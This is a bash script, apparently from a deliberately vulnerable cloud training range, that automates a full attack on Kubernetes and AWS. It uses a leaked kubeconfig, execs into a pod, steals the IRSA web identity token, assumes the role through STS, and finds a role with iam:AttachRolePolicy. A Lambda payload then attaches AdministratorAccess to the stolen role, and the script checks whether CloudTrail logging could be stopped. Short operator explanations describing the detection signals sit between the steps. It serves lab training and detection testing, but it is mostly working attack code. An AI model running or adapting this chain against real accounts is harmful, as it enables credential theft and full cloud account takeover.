#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Kubernetes - Scenario 03                ===" "${RESET}"
  printf "%sLeaked Kubeconfig -> IRSA Credential Theft -> Lambda PrivEsc%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  Step  1.  Authenticate with leaked kubeconfig\n"
  printf "  Step  2.  Cluster reconnaissance\n"
  printf "  Step  3.  Identify pod with IRSA + exec into it\n"
  printf "  Step  4.  Steal IRSA credentials from pod\n"
  printf "  Step  5.  IAM role and policy enumeration\n"
  printf "  Step  6.  Create and invoke privilege escalation Lambda\n"
  printf "  Step  7.  Verify account compromise\n"
  printf "  Step  8.  Cleanup\n"
}
banner

NAMESPACE="cdrgoat-sc03"
AWS_PROFILE_STOLEN="streamgoat-k8s03-stolen"

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in kubectl aws jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Kubeconfig input
#############################################
printf "\n"
step "Leaked kubeconfig setup"
if [ -n "${KUBECONFIG:-}" ] && [ -f "$KUBECONFIG" ]; then
  ok "Using KUBECONFIG from environment: ${YELLOW}${KUBECONFIG}${RESET}"
else
  info "Provide the path to the leaked kubeconfig file"
  printf "\n"
  read -r -p "  Kubeconfig path: " LEAKED_KUBECONFIG
  if [ ! -f "$LEAKED_KUBECONFIG" ]; then
    err "File not found: $LEAKED_KUBECONFIG"
    exit 1
  fi
  export KUBECONFIG="$LEAKED_KUBECONFIG"
  ok "Kubeconfig set: ${YELLOW}${KUBECONFIG}${RESET}"
fi

read -r -p "Everything is prepared. Press Enter to start the attack (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 1. Authenticate with Leaked Kubeconfig
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Authenticate with Leaked Kubeconfig  ===" "${RESET}"

step "Testing cluster access with leaked credentials"
spin_start "kubectl get namespaces"
set +e
NS_LIST=$(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}' 2>&1)
K8S_RC=$?
set -e
spin_stop

if [ $K8S_RC -eq 0 ]; then
  ok "Cluster access confirmed!"
  CLUSTER_ENDPOINT=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
  info "API Server: ${YELLOW}${CLUSTER_ENDPOINT}${RESET}"
  echo "$NS_LIST" | tr ' ' '\n' | while IFS= read -r ns; do printf "  %s\n" "$ns"; done
else
  err "Cannot access cluster with leaked kubeconfig"
  exit 1
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The attacker found a kubeconfig file in a public repository.\n"
printf "This could be from a CI/CD pipeline, a developer's dotfiles,\n"
printf "or a Terraform state file containing cluster credentials.\n\n"
printf "With the kubeconfig, the attacker has direct cluster access\n"
printf "from the internet (EKS API is publicly accessible by default).\n\n"

read -r -p "Step 1 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 2. Cluster Reconnaissance
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Cluster Reconnaissance  ===" "${RESET}"

step "Enumerating pods in accessible namespace"
PODS=$(kubectl get pods -n "$NAMESPACE" -o wide 2>/dev/null)
ok "Pods discovered:"
printf "  %s\n" "$PODS"

step "Checking SA permissions"
spin_start "kubectl auth can-i --list"
AUTH_LIST=$(kubectl auth can-i --list -n "$NAMESPACE" 2>/dev/null | grep -v "^Resources" | head -15)
spin_stop
ok "Permissions:"
echo "$AUTH_LIST" | while IFS= read -r line; do printf "  %s\n" "$line"; done

step "Checking pods/exec permission"
set +e
CAN_EXEC=$(kubectl auth can-i create pods --subresource=exec -n "$NAMESPACE" 2>/dev/null)
set -e
if [ "$CAN_EXEC" = "yes" ]; then
  ok "${RED}pods/exec allowed${RESET} - can exec into pods"
else
  err "pods/exec not allowed"
  exit 1
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The leaked SA has limited but dangerous permissions:\n"
printf "  list/get pods, services, configmaps, deployments\n"
printf "  ${RED}create pods/exec${RESET} - lateral movement into any pod\n\n"

read -r -p "Step 2 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 3. Find Pod with IRSA
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Identify Pod with IRSA (Cloud IAM Role)  ===" "${RESET}"

step "Listing pods in namespace"
POD_DETAILS=$(kubectl get pods -n "$NAMESPACE" -o json 2>/dev/null)
TARGET_POD=$(echo "$POD_DETAILS" | jq -r '.items[0].metadata.name' 2>/dev/null)
ok "Target pod: ${YELLOW}${TARGET_POD}${RESET}"

step "Probing pod for cloud credentials (exec into pod)"
info "Checking for IRSA env vars (AWS_ROLE_ARN, AWS_WEB_IDENTITY_TOKEN_FILE)"
set +e
IRSA_ROLE_ARN=$(kubectl exec -n "$NAMESPACE" "$TARGET_POD" -- printenv AWS_ROLE_ARN 2>/dev/null)
IRSA_TOKEN_FILE=$(kubectl exec -n "$NAMESPACE" "$TARGET_POD" -- printenv AWS_WEB_IDENTITY_TOKEN_FILE 2>/dev/null)
set -e

if [ -n "$IRSA_ROLE_ARN" ] && [ -n "$IRSA_TOKEN_FILE" ]; then
  ok "${RED}IRSA credentials found inside pod${RESET}"
  printf "  AWS_ROLE_ARN:                %s%s%s\n" "$RED" "$IRSA_ROLE_ARN" "$RESET"
  printf "  AWS_WEB_IDENTITY_TOKEN_FILE: %s%s%s\n" "$YELLOW" "$IRSA_TOKEN_FILE" "$RESET"
else
  err "No IRSA credentials in pod"
  exit 1
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "IRSA (IAM Roles for Service Accounts) assigns an AWS IAM role\n"
printf "to a specific Kubernetes ServiceAccount. Pods using that SA get\n"
printf "AWS credentials injected automatically via a projected token.\n\n"
printf "Unlike node role inheritance (via IMDS), IRSA credentials are\n"
printf "pod-specific and traceable in CloudTrail.\n\n"
printf "The attacker's interest: this pod has an AWS IAM role.\n"
printf "If the role is over-permissioned, it's a cloud pivot vector.\n\n"

read -r -p "Step 3 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 4. Steal IRSA Credentials
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Steal IRSA Credentials from Pod  ===" "${RESET}"

step "Discovering IRSA environment variables"
IRSA_ENV=$(kubectl exec -n "$NAMESPACE" "$TARGET_POD" -- env 2>/dev/null | grep -E "AWS_|IDENTITY" || true)
ok "IRSA environment:"
echo "$IRSA_ENV" | while IFS= read -r line; do printf "  %s%s%s\n" "$YELLOW" "$line" "$RESET"; done

step "Reading web identity token"
WEB_TOKEN=$(kubectl exec -n "$NAMESPACE" "$TARGET_POD" -- \
  cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token 2>/dev/null || true)

if [ -z "$WEB_TOKEN" ]; then
  err "IRSA token not found in pod"
  exit 1
fi
ok "Web identity token stolen (${#WEB_TOKEN} bytes)"
info "Token preview: ${YELLOW}${WEB_TOKEN:0:50}...${RESET}"

step "Assuming IRSA role via STS"
ROLE_ARN=$(kubectl exec -n "$NAMESPACE" "$TARGET_POD" -- \
  printenv AWS_ROLE_ARN 2>/dev/null || true)

if [ -z "$ROLE_ARN" ]; then
  ROLE_ARN="$IRSA_ROLE_ARN"
fi

spin_start "sts:AssumeRoleWithWebIdentity"
set +e
STS_RESULT=$(aws sts assume-role-with-web-identity \
  --role-arn "$ROLE_ARN" \
  --role-session-name "cdrgoat-attack" \
  --web-identity-token "$WEB_TOKEN" \
  --output json 2>&1)
STS_RC=$?
set -e
spin_stop

if [ $STS_RC -ne 0 ]; then
  err "Failed to assume role: $STS_RESULT"
  exit 1
fi

AWS_ACCESS_KEY=$(echo "$STS_RESULT" | jq -r '.Credentials.AccessKeyId')
AWS_SECRET_KEY=$(echo "$STS_RESULT" | jq -r '.Credentials.SecretAccessKey')
AWS_SESSION_TOKEN=$(echo "$STS_RESULT" | jq -r '.Credentials.SessionToken')

ok "IRSA role assumed!"
printf "\n%s%s%s\n" "${BOLD}${RED}" "STOLEN AWS CREDENTIALS (via IRSA)" "${RESET}"
printf "%s\n" "---------------------------------------------------------------------"
printf "  AccessKeyId     : %s%s%s\n" "$YELLOW" "$AWS_ACCESS_KEY" "$RESET"
printf "  SecretAccessKey  : %s%s...%s\n" "$YELLOW" "${AWS_SECRET_KEY:0:20}" "$RESET"
printf "  Role            : %s%s%s\n" "$RED" "$ROLE_ARN" "$RESET"
printf "%s\n" "---------------------------------------------------------------------"

aws configure set aws_access_key_id "$AWS_ACCESS_KEY" --profile "$AWS_PROFILE_STOLEN"
aws configure set aws_secret_access_key "$AWS_SECRET_KEY" --profile "$AWS_PROFILE_STOLEN"
aws configure set aws_session_token "$AWS_SESSION_TOKEN" --profile "$AWS_PROFILE_STOLEN"
aws configure set region us-east-1 --profile "$AWS_PROFILE_STOLEN"

step "Verifying stolen identity"
CALLER_ID=$(aws sts get-caller-identity --profile "$AWS_PROFILE_STOLEN" --output json 2>/dev/null)
ok "Operating as: ${YELLOW}$(echo "$CALLER_ID" | jq -r '.Arn')${RESET}"

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "IRSA credentials are not in IMDS - they're injected as:\n"
printf "  ${YELLOW}AWS_ROLE_ARN${RESET} - the IAM role to assume\n"
printf "  ${YELLOW}AWS_WEB_IDENTITY_TOKEN_FILE${RESET} - path to the OIDC token\n\n"
printf "The attacker reads the token file and calls\n"
printf "${MAGENTA}sts:AssumeRoleWithWebIdentity${RESET} to get temporary credentials.\n\n"
printf "In CloudTrail, these actions are traceable to the specific\n"
printf "K8s ServiceAccount (visible in webIdFederationData).\n\n"

read -r -p "Step 4 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 5. IAM Role and Policy Enumeration
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. IAM Role and Policy Enumeration  ===" "${RESET}"

step "Listing IAM roles"
spin_start "aws iam list-roles"
ALL_ROLES=$(aws iam list-roles --profile "$AWS_PROFILE_STOLEN" --output json 2>/dev/null | \
  jq -r '.Roles[].RoleName')
spin_stop

STREAMGOAT_ROLES=$(echo "$ALL_ROLES" | grep -i "StreamGoat-k8s03" || true)
if [ -n "$STREAMGOAT_ROLES" ]; then
  ok "Interesting roles found:"
  echo "$STREAMGOAT_ROLES" | while IFS= read -r role; do printf "  %s%s%s\n" "$RED" "$role" "$RESET"; done
else
  ok "Roles enumerated ($(echo "$ALL_ROLES" | wc -l | tr -d ' ') total)"
fi

step "Enumerating policies on interesting roles"
PRIVESC_ROLE=""
for role in $STREAMGOAT_ROLES; do
  printf "  Checking: %s%s%s\n" "$YELLOW" "$role" "$RESET"
  set +e
  INLINE_POLICIES=$(aws iam list-role-policies --role-name "$role" --profile "$AWS_PROFILE_STOLEN" --output json 2>/dev/null | \
    jq -r '.PolicyNames[]' 2>/dev/null)
  set -e
  for pol in $INLINE_POLICIES; do
    POL_DOC=$(aws iam get-role-policy --role-name "$role" --policy-name "$pol" --profile "$AWS_PROFILE_STOLEN" --output json 2>/dev/null)
    if echo "$POL_DOC" | jq -r '.PolicyDocument.Statement[].Action' 2>/dev/null | grep -q "AttachRolePolicy"; then
      PRIVESC_ROLE="$role"
      ok "${RED}PRIVESC VECTOR: ${role} has iam:AttachRolePolicy${RESET}"
      printf "  Policy: %s%s%s\n" "$YELLOW" "$pol" "$RESET"
      echo "$POL_DOC" | jq -r '.PolicyDocument.Statement[].Action | if type == "array" then .[] else . end' 2>/dev/null | while IFS= read -r action; do
        printf "    %s%s%s\n" "$MAGENTA" "$action" "$RESET"
      done
    fi
  done
done

if [ -z "$PRIVESC_ROLE" ]; then
  err "No role with iam:AttachRolePolicy found"
  exit 1
fi

PRIVESC_ROLE_ARN=$(aws iam get-role --role-name "$PRIVESC_ROLE" --profile "$AWS_PROFILE_STOLEN" --query 'Role.Arn' --output text 2>/dev/null)

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We enumerated IAM roles and found ${RED}${PRIVESC_ROLE}${RESET}\n"
printf "with ${RED}iam:AttachRolePolicy${RESET} permission.\n\n"
printf "Combined with our IRSA role's lambda:CreateFunction + iam:PassRole,\n"
printf "we can create a Lambda with the privesc role and have it attach\n"
printf "AdministratorAccess to our own IRSA role.\n\n"

read -r -p "Step 5 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 6. Create and Invoke PrivEsc Lambda
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Create and Invoke Privilege Escalation Lambda  ===" "${RESET}"

IRSA_ROLE_NAME=$(echo "$ROLE_ARN" | awk -F/ '{print $NF}')
step "Creating privesc Lambda function"
info "Lambda will attach AdministratorAccess to our IRSA role: ${YELLOW}${IRSA_ROLE_NAME}${RESET}"

LAMBDA_NAME="StreamGoat-k8s03-PrivEsc-$(date +%s)"
WORKDIR=$(mktemp -d)
PYFILE="${WORKDIR}/index.py"
ZIPFILE="${WORKDIR}/payload.zip"

cat > "$PYFILE" <<PYCODE
import boto3
import json

def handler(event, context):
    iam = boto3.client('iam')
    target_role = event.get('target_role', '${IRSA_ROLE_NAME}')
    policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'

    try:
        iam.attach_role_policy(RoleName=target_role, PolicyArn=policy_arn)
        return {'status': 'success', 'role': target_role, 'policy': policy_arn}
    except Exception as e:
        return {'status': 'error', 'message': str(e)}
PYCODE

cd "$WORKDIR" && zip -q -r "$(basename "$ZIPFILE")" "index.py"
cd - > /dev/null

spin_start "Creating Lambda: ${LAMBDA_NAME}"
set +e
CREATE_RESULT=$(aws lambda create-function \
  --function-name "$LAMBDA_NAME" \
  --runtime python3.12 \
  --handler index.handler \
  --role "$PRIVESC_ROLE_ARN" \
  --zip-file "fileb://${ZIPFILE}" \
  --timeout 30 \
  --profile "$AWS_PROFILE_STOLEN" \
  --output json 2>&1)
CREATE_RC=$?
set -e
spin_stop

if [ $CREATE_RC -ne 0 ]; then
  err "Failed to create Lambda: $CREATE_RESULT"
  exit 1
fi
ok "Lambda created: ${RED}${LAMBDA_NAME}${RESET}"

step "Waiting for Lambda to be active"
sleep 5

step "Invoking privesc Lambda"
spin_start "Invoking Lambda (attaching AdministratorAccess to ${IRSA_ROLE_NAME})"
INVOKE_OUTPUT="${WORKDIR}/invoke-output.json"
set +e
aws lambda invoke \
  --function-name "$LAMBDA_NAME" \
  --payload "{\"target_role\": \"${IRSA_ROLE_NAME}\"}" \
  --cli-binary-format raw-in-base64-out \
  --profile "$AWS_PROFILE_STOLEN" \
  "$INVOKE_OUTPUT" >/dev/null 2>&1
INVOKE_RC=$?
set -e
spin_stop

if [ $INVOKE_RC -eq 0 ] && [ -s "$INVOKE_OUTPUT" ]; then
  INVOKE_RESULT=$(jq -r '.status // empty' "$INVOKE_OUTPUT" 2>/dev/null)
  if [ "$INVOKE_RESULT" = "success" ]; then
    ok "${RED}PRIVILEGE ESCALATION SUCCESSFUL${RESET}"
    printf "  AdministratorAccess attached to: %s%s%s\n" "$RED" "$IRSA_ROLE_NAME" "$RESET"
  else
    INVOKE_ERR=$(jq -r '.message // empty' "$INVOKE_OUTPUT" 2>/dev/null)
    err "Lambda returned error: ${INVOKE_ERR:-unknown}"
  fi
else
  err "Lambda invocation failed"
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We created a Lambda with the ${RED}${PRIVESC_ROLE}${RESET} role\n"
printf "and had it attach ${RED}AdministratorAccess${RESET} to our IRSA role.\n\n"
printf "Next: re-assume the IRSA role to get credentials with admin.\n\n"

read -r -p "Step 6 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 7. Verify Account Compromise
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 7. Verify Account Compromise  ===" "${RESET}"

step "Re-assuming IRSA role with escalated permissions"
spin_start "sts:AssumeRoleWithWebIdentity (with AdministratorAccess)"

# Re-read token (may have rotated)
WEB_TOKEN2=$(kubectl exec -n "$NAMESPACE" "$TARGET_POD" -- \
  cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token 2>/dev/null || true)
[ -z "$WEB_TOKEN2" ] && WEB_TOKEN2="$WEB_TOKEN"

set +e
STS_RESULT2=$(aws sts assume-role-with-web-identity \
  --role-arn "$ROLE_ARN" \
  --role-session-name "cdrgoat-admin" \
  --web-identity-token "$WEB_TOKEN2" \
  --output json 2>&1)
set -e
spin_stop

AWS_ACCESS_KEY2=$(echo "$STS_RESULT2" | jq -r '.Credentials.AccessKeyId')
AWS_SECRET_KEY2=$(echo "$STS_RESULT2" | jq -r '.Credentials.SecretAccessKey')
AWS_SESSION_TOKEN2=$(echo "$STS_RESULT2" | jq -r '.Credentials.SessionToken')

aws configure set aws_access_key_id "$AWS_ACCESS_KEY2" --profile "$AWS_PROFILE_STOLEN"
aws configure set aws_secret_access_key "$AWS_SECRET_KEY2" --profile "$AWS_PROFILE_STOLEN"
aws configure set aws_session_token "$AWS_SESSION_TOKEN2" --profile "$AWS_PROFILE_STOLEN"
ok "Credentials refreshed with admin permissions"

step "Waiting for policy propagation"
sleep 10

step "Testing admin permissions"
printf "%s[*]%s Permission checks:\n" "${YELLOW}" "${RESET}"

for check in \
  "s3 ListAllMyBuckets|aws s3 ls" \
  "iam ListUsers|aws iam list-users --max-items 1" \
  "cloudtrail DescribeTrails|aws cloudtrail describe-trails"; do
  perm="${check%%|*}"
  cmd="${check#*|}"
  set +e
  eval "$cmd --profile $AWS_PROFILE_STOLEN >/dev/null 2>&1"
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "  %s[OK]%s  %s\n" "$GREEN" "$RESET" "$perm"
  else
    printf "  %s[DENY]%s %s\n" "$RED" "$RESET" "$perm"
  fi
done

step "Defense evasion check (read-only)"
info "Checking if cloudtrail:StopLogging would be possible (not executing)"
set +e
CAN_STOP=$(aws cloudtrail describe-trails --profile "$AWS_PROFILE_STOLEN" --query 'trailList[].Name' --output text 2>/dev/null)
set -e
if [ -n "$CAN_STOP" ]; then
  ok "${RED}cloudtrail:StopLogging is available${RESET} (trails found: $(echo "$CAN_STOP" | wc -w | tr -d ' '))"
  info "Not executing - destructive action. Detection signal: cloudtrail:DescribeTrails was logged."
else
  info "No CloudTrail trails found or no access"
fi

printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The IRSA role now has ${RED}AdministratorAccess${RESET}.\n"
printf "Unlike node role IMDS theft, this is traceable in CloudTrail:\n"
printf "  ${YELLOW}webIdFederationData.attributes.sub${RESET} shows the K8s SA\n"
printf "  ${YELLOW}sessionIssuer.arn${RESET} shows the IRSA role\n\n"
printf "But the attacker still has full admin access to the AWS account.\n\n"

read -r -p "Step 7 completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

################################################################################
# Step 8. Cleanup
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 8. Cleanup  ===" "${RESET}"

step "Deleting privesc Lambda"
set +e
aws lambda delete-function --function-name "$LAMBDA_NAME" --profile "$AWS_PROFILE_STOLEN" >/dev/null 2>&1
set -e
ok "Lambda deleted: ${LAMBDA_NAME}"

rm -rf "$WORKDIR"

################################################################################
# Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}" "FULL ATTACK CHAIN COMPLETE" "${RESET}"
printf "%s\n" "====================================================================="
printf "  ${GREEN}[1]${RESET}  Authenticated with leaked kubeconfig\n"
printf "  ${GREEN}[2]${RESET}  Cluster reconnaissance - found pods, permissions\n"
printf "  ${GREEN}[3]${RESET}  Exec into pod - discovered IRSA credentials\n"
printf "  ${GREEN}[4]${RESET}  IRSA credentials stolen (web identity token)\n"
printf "  ${GREEN}[5]${RESET}  IAM enumeration - found privesc role with AttachRolePolicy\n"
printf "  ${GREEN}[6]${RESET}  Lambda privesc - AdministratorAccess attached to IRSA role\n"
printf "  ${GREEN}[7]${RESET}  Account compromise verified\n"
printf "  ${GREEN}[8]${RESET}  Cleanup - Lambda deleted\n"
printf "%s\n" "====================================================================="

step "Cleanup reminder"
info "See README.md for full cleanup instructions."

printf "Attack simulation complete.\n"
